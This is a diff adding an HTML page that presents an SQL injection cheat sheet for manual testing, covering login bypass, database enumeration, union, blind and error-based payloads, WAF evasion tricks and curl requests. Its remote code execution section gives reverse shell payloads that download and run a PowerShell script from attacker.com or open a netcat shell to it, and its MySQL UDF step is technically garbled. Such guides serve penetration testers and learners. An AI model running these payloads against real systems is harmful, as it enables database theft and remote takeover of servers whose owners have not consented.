@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Comprehensive SQL Injection Cheat Sheet for manual testing, including expected outputs and advanced techniques.">
+    <meta name="keywords" content="SQL Injection, Manual SQL Injection, SQL Injection Cheat Sheet, Database Security">
+    <title>SQL Injection Cheat Sheet by Anubhab Mukherjee</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        header {
+            background: #35424a;
+            color: #ffffff;
+            padding: 20px 0;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .container {
+            padding: 20px;
+            max-width: 1000px;
+            margin: auto;
+            background: #ffffff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .section {
+            margin-bottom: 20px;
+        }
+        .section h2 {
+            margin-top: 0;
+            color: #35424a;
+        }
+        .section h3 {
+            color: #2e6da4;
+        }
+        .code {
+            background: #e2e2e2;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: "Courier New", Courier, monospace;
+        }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 0.9em;
+            color: #666;
+        }
+        .footer a {
+            color: #0056b3;
+            text-decoration: none;
+            margin-left: 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .linkedin-logo {
+            width: 20px;
+            vertical-align: middle;
+        }
+        .ul {
+            padding-left: 20px;
+        }
+        ul li {
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>SQL Injection Cheat Sheet</h1>
+        <p>Author: Anubhab Mukherjee</p>
+        <p>This cheat sheet is for basic manual testing purposes. For advanced payloads, visit GitHub repositories.</p>
+    </header>
+    <div class="container">
+        <div class="section">
+            <h2>Comments</h2>
+            <p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
+            <div class="code">
+                <strong>Oracle:</strong> <br>
+                --comment <br>
+                <strong>Microsoft:</strong> <br>
+                --comment <br>
+                /*comment*/ <br>
+                <strong>PostgreSQL:</strong> <br>
+                --comment <br>
+                /*comment*/ <br>
+                <strong>MySQL:</strong> <br>
+                #comment <br>
+                -- comment [Note the space after the double dash] <br>
+                /*comment*/ <br>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Step 1: Identify Injection Point</h2>
+            <p>Test Payloads</p>
+            <div class="code">
+                <p>' OR '1'='1</p>
+                <p>" OR "1"="1</p>
+                <p>' OR '1'='1' -- </p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: The page returns a list of users, bypasses login, or returns data that shouldn't be accessible.</li>
+                <li>Failure: No change in behavior or an error message.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Proceed to Step 2.</li>
+                <li>Failure: Try different payloads or injection points.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Step 2: Test for SQL Injection Vulnerability</h2>
+            <p>MySQL</p>
+            <div class="code">
+                <p>' AND 1=1--</p>
+                <p>' AND 1=2--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>1=1: Page loads normally.</li>
+                <li>1=2: Page shows an error or different behavior.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: SQL injection is likely present. Proceed to Step 3.</li>
+                <li>Failure: Try different payloads or consider other types of injections.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Step 3: Enumerate Database Information</h2>
+            <h3>Determining the Number of Columns</h3>
+            <p>Use ORDER BY clause to find the number of columns:</p>
+            <div class="code">
+                <p>MySQL</p>
+                <p>ORDER BY 1--</p>
+                <p>ORDER BY 2--</p>
+                <p>ORDER BY 3--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Valid Column Count: Page loads normally.</li>
+                <li>Invalid Column Count: Page shows an error.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Identify the valid number of columns and proceed with UNION SELECT.</li>
+                <li>Failure: Increase the column count until an error is encountered.</li>
+            </ul>
+
+            <h3>Finding the Database Name</h3>
+            <div class="code">
+                <p>MySQL</p>
+                <p>SELECT database()--</p>
+                <p>PostgreSQL</p>
+                <p>SELECT current_database()--</p>
+                <p>Microsoft SQL Server</p>
+                <p>SELECT db_name()--</p>
+                <p>Oracle</p>
+                <p>SELECT ora_database_name FROM dual--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Database name is returned.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Proceed to enumerate table names.</li>
+                <li>Failure: Try different techniques or payloads.</li>
+            </ul>
+
+            <h3>Listing Table Names</h3>
+            <div class="code">
+                <p>MySQL</p>
+                <p>SELECT table_name FROM information_schema.tables WHERE table_schema=database()--</p>
+                <p>PostgreSQL</p>
+                <p>SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()--</p>
+                <p>Microsoft SQL Server</p>
+                <p>SELECT table_name FROM information_schema.tables--</p>
+                <p>Oracle</p>
+                <p>SELECT table_name FROM all_tables--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: List of table names.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Proceed to enumerate column names.</li>
+                <li>Failure: Try different techniques or payloads.</li>
+            </ul>
+
+            <h3>Listing Column Names</h3>
+            <div class="code">
+                <p>MySQL</p>
+                <p>SELECT column_name FROM information_schema.columns WHERE table_name='table_name'--</p>
+                <p>PostgreSQL</p>
+                <p>SELECT column_name FROM information_schema.columns WHERE table_name='table_name'--</p>
+                <p>Microsoft SQL Server</p>
+                <p>SELECT column_name FROM information_schema.columns WHERE table_name='table_name'--</p>
+                <p>Oracle</p>
+                <p>SELECT column_name FROM all_tab_columns WHERE table_name='table_name'--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: List of column names.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Proceed to extract data.</li>
+                <li>Failure: Try different techniques or payloads.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Advanced Enumeration Techniques</h2>
+            <h3>Enumerating Other Databases on the Server</h3>
+            <div class="code">
+                <p>MySQL</p>
+                <p>SELECT schema_name FROM information_schema.schemata--</p>
+                <p>PostgreSQL</p>
+                <p>SELECT datname FROM pg_database--</p>
+                <p>Microsoft SQL Server</p>
+                <p>SELECT name FROM master.sys.databases--</p>
+                <p>Oracle</p>
+                <p>SELECT name FROM v$database--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: List of all databases.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Identify interesting databases and proceed to enumerate tables and columns.</li>
+                <li>Failure: Try different techniques or payloads.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Extracting Data</h2>
+            <div class="code">
+                <p>MySQL</p>
+                <p>SELECT column1, column2 FROM table_name--</p>
+                <p>PostgreSQL</p>
+                <p>SELECT column1, column2 FROM table_name--</p>
+                <p>Microsoft SQL Server</p>
+                <p>SELECT column1, column2 FROM table_name--</p>
+                <p>Oracle</p>
+                <p>SELECT column1, column2 FROM table_name--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Desired data is returned.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Analyze and utilize the extracted data.</li>
+                <li>Failure: Try different techniques or payloads.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Remote Code Execution (RCE) and Reverse Shell Techniques</h2>
+            <h3>RCE with xp_cmdshell (Microsoft SQL Server)</h3>
+            <p>Requirements</p>
+            <ul>
+                <li>Permissions: Requires sysadmin privileges.</li>
+            </ul>
+            <p>Payload</p>
+            <div class="code">
+                <p>EXEC xp_cmdshell 'whoami'--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Command output, e.g., current user.</li>
+            </ul>
+            <h3>Reverse Shell</h3>
+            <div class="code">
+                <p>EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"'--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Reverse shell connection.</li>
+            </ul>
+
+            <h3>RCE with User-Defined Functions (MySQL)</h3>
+            <p>Requirements</p>
+            <ul>
+                <li>Permissions: Requires file privilege.</li>
+            </ul>
+            <p>Payload</p>
+            <div class="code">
+                <p>SELECT 1 INTO OUTFILE '/tmp/udf.dll' FROM mysql.user LIMIT 1;</p>
+                <p>CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';</p>
+                <p>SELECT sys_eval('whoami')--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Command output, e.g., current user.</li>
+            </ul>
+            <h3>Reverse Shell</h3>
+            <div class="code">
+                <p>SELECT sys_eval('nc -e /bin/sh attacker.com 4444')--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Reverse shell connection.</li>
+            </ul>
+
+            <h3>RCE with dbms_java (Oracle)</h3>
+            <p>Requirements</p>
+            <ul>
+                <li>Permissions: Requires JAVA permissions.</li>
+            </ul>
+            <p>Payload</p>
+            <div class="code">
+                <p>EXEC dbms_java.runjava('oracle/aurora/util/Wrapper c:\windows\system32\cmd.exe /c whoami')--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Command output, e.g., current user.</li>
+            </ul>
+            <h3>Reverse Shell</h3>
+            <div class="code">
+                <p>EXEC dbms_java.runjava('oracle/aurora/util/Wrapper c:\windows\system32\cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"')--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Reverse shell connection.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Blind SQL Injection Techniques</h2>
+            <h3>Boolean-Based Blind SQL Injection</h3>
+            <div class="code">
+                <p>MySQL: ' AND '1'='1--</p>
+                <p>PostgreSQL: ' AND '1'='1--</p>
+                <p>Microsoft SQL Server: ' AND '1'='1--</p>
+                <p>Oracle: ' AND '1'='1--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>True Condition: Page loads normally.</li>
+                <li>False Condition: Page shows an error or different behavior.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Proceed with further blind SQL injection techniques.</li>
+                <li>Failure: Try different payloads or conditions.</li>
+            </ul>
+
+            <h3>Time-Based Blind SQL Injection</h3>
+            <div class="code">
+                <p>MySQL: ' AND SLEEP(5)--</p>
+                <p>PostgreSQL: ' AND pg_sleep(5)--</p>
+                <p>Microsoft SQL Server: ' AND WAITFOR DELAY '00:00:05'--</p>
+                <p>Oracle: ' AND dbms_pipe.receive_message('a', 5)--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Page delays for specified time.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Proceed with further time-based blind SQL injection techniques.</li>
+                <li>Failure: Try different payloads or conditions.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Union-Based SQL Injection</h2>
+            <div class="code">
+                <p>MySQL</p>
+                <p>' UNION SELECT NULL, column1, column2 FROM table_name--</p>
+                <p>PostgreSQL</p>
+                <p>' UNION SELECT NULL, column1, column2 FROM table_name--</p>
+                <p>Microsoft SQL Server</p>
+                <p>' UNION SELECT NULL, column1, column2 FROM table_name--</p>
+                <p>Oracle</p>
+                <p>' UNION SELECT NULL, column1, column2 FROM table_name--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Data from specified columns.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Proceed with data extraction.</li>
+                <li>Failure: Try different columns or tables.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Error-Based SQL Injection Techniques</h2>
+            <div class="code">
+                <p>MySQL</p>
+                <p>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--</p>
+                <p>PostgreSQL</p>
+                <p>' AND 1=(SELECT cast((current_database()) as int))--</p>
+                <p>Microsoft SQL Server</p>
+                <p>' AND 1=convert(int,(db_name()))--</p>
+                <p>Oracle</p>
+                <p>' AND 1=(SELECT to_number((SELECT user FROM dual)))--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Error message with database name.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Use information from error messages to further exploit.</li>
+                <li>Failure: Try different payloads or techniques.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>WAF/Firewall Bypass Techniques</h2>
+            <ul>
+                <li><strong>Case Variation:</strong> Using different cases to bypass pattern matching. <em>Example: UnIoN SeLeCt</em></li>
+                <li><strong>Comment Insertion:</strong> Breaking up keywords with comments. <em>Example: UN/**/ION SEL/**/ECT</em></li>
+                <li><strong>String Concatenation:</strong> Using string concatenation to avoid detection. <em>Example: SEL'+'ECT</em></li>
+                <li><strong>Hex Encoding:</strong> Using hex encoding for payloads. <em>Example: UNION SELECT 0x61646d696e</em></li>
+                <li><strong>Whitespace Variation:</strong> Using different whitespace characters. <em>Example: UNION%0ASELECT</em></li>
+                <li><strong>URL Encoding:</strong> URL encoding parts of the payload. <em>Example: UNION%20SELECT</em></li>
+                <li><strong>Obfuscation with Functions:</strong> Using database-specific functions to obfuscate payloads.
+                    <ul>
+                        <li><strong>MySQL:</strong> UNION SELECT user FROM mysql.user WHERE user = CHAR(114, 111, 111, 116)</li>
+                        <li><strong>PostgreSQL:</strong> UNION SELECT current_user FROM information_schema.columns WHERE table_name = CHR(116)||CHR(97)||CHR(98)||CHR(108)||CHR(101)||CHR(115)</li>
+                        <li><strong>Microsoft SQL Server:</strong> UNION SELECT name FROM sys.databases WHERE name = CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)+CHAR(101)+CHAR(114)</li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Advanced Techniques</h2>
+            <h3>Error-Based SQL Injection with WAF Bypass</h3>
+            <div class="code">
+                <p>MySQL</p>
+                <p>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--</p>
+                <p>PostgreSQL</p>
+                <p>' AND 1=(SELECT cast((current_database()) as int))--</p>
+                <p>Microsoft SQL Server</p>
+                <p>' AND 1=convert(int,(db_name()))--</p>
+                <p>Oracle</p>
+                <p>' AND 1=(SELECT to_number((SELECT user FROM dual)))--</p>
+            </div>
+            <p>Expected Output</p>
+            <ul>
+                <li>Success: Error message with database name.</li>
+            </ul>
+            <p>Next Steps</p>
+            <ul>
+                <li>Success: Use information from error messages to further exploit.</li>
+                <li>Failure: Try different payloads or techniques.</li>
+            </ul>
+        </div>
+        <h3>Handling CSRF Tokens in SQL Injection</h3>
+    <div class="code">
+        <p><strong>Step 1: Capture CSRF Token</strong></p>
+        <p>Use tools like Burp Suite to capture the CSRF token from the request.</p>
+
+        <p><strong>Step 2: Include CSRF Token in Request</strong></p>
+        <p>Use the captured CSRF token in your SQL injection payload.</p>
+
+        <p><strong>Send SQL Injection Payload with CSRF Token:</strong></p>
+        <pre><code>curl -X POST http://example.com/item \
+-d "id=1' OR '1'='1-- " \
+-d "csrf_token=abcd1234"</code></pre>
+
+        <p><strong>Testing Boolean-based Blind SQL Injection:</strong></p>
+        <p><strong>True Condition:</strong></p>
+        <pre><code>curl -X POST http://example.com/item \
+-d "id=1' AND 1=1-- " \
+-d "csrf_token=abcd1234"</code></pre>
+        <p><strong>False Condition:</strong></p>
+        <pre><code>curl -X POST http://example.com/item \
+-d "id=1' AND 1=2-- " \
+-d "csrf_token=abcd1234"</code></pre>
+
+        <p><strong>Testing Time-based Blind SQL Injection:</strong></p>
+        <p><strong>Condition with Delay:</strong></p>
+        <pre><code>curl -X POST http://example.com/item \
+-d "id=1' AND IF(1=1, SLEEP(5), 0)-- " \
+-d "csrf_token=abcd1234"</code></pre>
+        <p><strong>Condition without Delay:</strong></p>
+        <pre><code>curl -X POST http://example.com/item \
+-d "id=1' AND IF(1=2, SLEEP(5), 0)-- " \
+-d "csrf_token=abcd1234"</code></pre>
+    </div>
+
+    <h3>Expected Output</h3>
+    <ul>
+        <li>Success: Error message or delay indicating successful injection.</li>
+    </ul>
+
+    <h3>Next Steps</h3>
+    <ul>
+        <li>Success: Use captured data or behavior to further exploit the vulnerability.</li>
+        <li>Failure: Adjust payloads or methods and retry.</li>
+    </ul>
+    </div>
+    <div class="footer">
+        <p>If you think any information provided is incorrect, feel free to contact me. Let's make this page more supportive and accurate.</p>
+        <p>
+            Contact: 
+            <a href="https://in.linkedin.com/in/anubhab-mukherjee-019961204">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png" alt="LinkedIn Logo" class="linkedin-logo">
+                Anubhab Mukherjee
+            </a>
+        </p>
+    </div>
+</body>
+
+</html>
